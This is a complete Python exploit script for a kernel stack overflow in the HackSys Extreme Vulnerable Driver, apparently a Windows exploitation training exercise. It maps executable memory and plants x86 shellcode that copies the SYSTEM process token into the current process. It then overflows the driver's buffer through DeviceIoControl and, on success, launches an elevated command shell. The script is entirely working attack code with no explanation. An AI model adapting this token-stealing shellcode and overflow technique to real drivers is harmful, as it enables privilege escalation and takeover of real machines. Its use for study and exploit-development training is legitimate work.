import ctypes,os,struct,sys
from ctypes import *
import subprocess
from ctypes.wintypes import *
from win32com.shell import shell

ntdll=windll.ntdll
kernel32=windll.kernel32

lpFileName="\\\\.\\HackSysExtremeVulnerableDriver"
GENERIC_READ=0x80000000
GENERIC_WRITE=0x40000000
OPEN_EXISTING=0x3
INVALID_HANDLE_VALUE=-1
dwIoControlCode=0x222007
MEM_COMMIT=0x00001000
MEM_RESERVE=0x00002000
PAGE_EXECUTE_READWRITE=0x40
STATUS_SUCCESS=0
shellcode_addr=0x41410000

def alloc_memory(addr,payload_size,payload):
	print("[*] Allocating memory at="+hex(addr))
	c_addr=c_int(addr)
	c_payload_size=c_int(payload_size)
	ret=ntdll.NtAllocateVirtualMemory(0xffffffff,#ProcessHandle
					  byref(c_addr),#BaseAddress
					  0, #Zerobits
					  byref(c_payload_size), #RegionSize
					  MEM_COMMIT|MEM_RESERVE, #AllocationType
					  PAGE_EXECUTE_READWRITE) #Protect
	if ret!=STATUS_SUCCESS:
		print("[-] Failed to allocate memory. Error="+str(kernel32.GetLastError()))
		sys.exit()
	lpNumberofBytesWritten=c_ulong()
	ret=kernel32.WriteProcessMemory(0xffffffff,#hProcess
					addr,#lpBaseAddress
					payload,#lpBuffer
					payload_size,#Size
					byref(lpNumberofBytesWritten))#lpNumberOfBytesWritten
	if ret==0:
		print("[-] Failed to write to allocated memory. Error="+str(kernel32.GetLastError()))
		sys.exit()

def token_stealing_shellcode():
	shellcode=(
	"\x60" #pushad
        "\x64\xA1\x24\x01\x00\x00" # mov eax,fs:[0x124]; get KTHREAD
        "\x8b\x40\x50" # mov eax,[eax+0x50]; get  EPROCESS
        "\x89\xc1"# mov ecx,eax
        "\xBA\x04\x00\x00\x00"#mov edx,4
        "\x8B\x80\xB8\x00\x00\x00"#mov eax,[eax+0xb8]; get FD
        "\x2D\xB8\x00\x00\x00"#sub eax,0xb8; get EPROCESS
        "\x39\x90\xB4\x00\x00\x00"# cmp [eax+0xb4],edx; check PID
        "\x0F\x85\xE9\xFF\xFF\xFF"# jnz -19
        "\x8B\x80\xF8\x00\x00\x00"#mov eax,[eax+0xf8]; get token
        "\x89\x81\xF8\x00\x00\x00"#mov [ecx+0xf8],eax; rewrite token
        "\x61" #popad
        "\x31\xC0" #eax=0
        "\x5D" # pop ebp
	"\xC2\x08\x00"  #ret     
	)
	return shellcode

def trigger_overflow():
	handle=kernel32.CreateFileA(lpFileName,#lpFileName
					GENERIC_READ|GENERIC_WRITE,#dwDesiredAccess
					0,#dwShareMode
					None,#lpSecurityAttributes
					OPEN_EXISTING,#dwCreationDisposition
					0,#dwFlagsAndAttributes
					None)#hTemplateFile
	if handle==INVALID_HANDLE_VALUE:
		print("[-] Failed to open device file. Error: "+str(kernel32.GetLastError()))
		sys.exit()
	
	shellcode=token_stealing_shellcode()
	alloc_memory(shellcode_addr,len(shellcode),shellcode)
	payload="A"*0x220+struct.pack("<L",shellcode_addr)
	payload_addr=id(payload)+0x14
	lpBytesReturned=c_ulong()
	kernel32.DeviceIoControl(handle, #hDevice
				dwIoControlCode, #dwIoControlCode
				payload_addr, #lpInBuffer
				len(payload), #nInBufferSize
				None, #lpOutBuffer
				0, #noutBufferSize
				byref(lpBytesReturned), #lpBytesReturned
				None) #lpOverlapped
	if shell.IsUserAnAdmin():
		print("[+] Priv esc achieved!")
		print("[+] Here is your root shell!")
		new_process=subprocess.Popen("start cmd",shell=True)
	else:
		print("[-] Priv esc failed!")

if __name__=='__main__':
	trigger_overflow()
